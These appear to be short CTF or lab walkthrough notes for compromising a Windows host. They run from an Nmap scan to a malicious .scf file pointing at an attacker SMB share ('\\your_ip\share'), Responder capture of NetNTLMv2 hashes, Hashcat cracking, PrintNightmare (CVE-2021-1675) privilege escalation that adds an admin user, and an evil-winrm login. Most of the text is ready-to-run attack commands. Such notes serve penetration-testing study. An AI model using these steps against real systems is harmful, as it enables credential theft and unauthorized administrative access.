#### Nmap scan results 
```
80/tcp   open  http         Microsoft IIS httpd 10.0
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds                                       
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) (win-rm)
```

* Save the below code as .scf and find a way to upload it.
```
[Shell]
Command=2
IconFile=\\your_ip\share\pentestlab.ico
[Taskbar]
Command=ToggleDeskto
```
* Run Responder
```
responder -wrf --lm -v -I tun0
```
* Identify the hash with hashid
 should be NetNTLMv2 hash
 
* pass the hash and crack with Hashcat mode -m 5600
-------------------------------------------------------------

### CVE-2021-1675 (priv esc)
> github:https://github.com/calebstewart/CVE-2021-1675 

```
*Evil-WinRM* PS C:\temp> Get-executionpolicy
Restricted
*Evil-WinRM* PS C:\temp> Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
*Evil-WinRM* PS C:\temp> Get-executionpolicy
Unrestricted
*Evil-WinRM* PS C:\temp> Import-Module .\print-nightmare.ps1
*Evil-WinRM* PS C:\temp> Invoke-Nightmare -NewUser "john" -NewPassword "password" -DriverName "PrintMe"
```

* new evil-winrm session
```
evil-winrm -i 192.168.1.1 -u john -p password
```
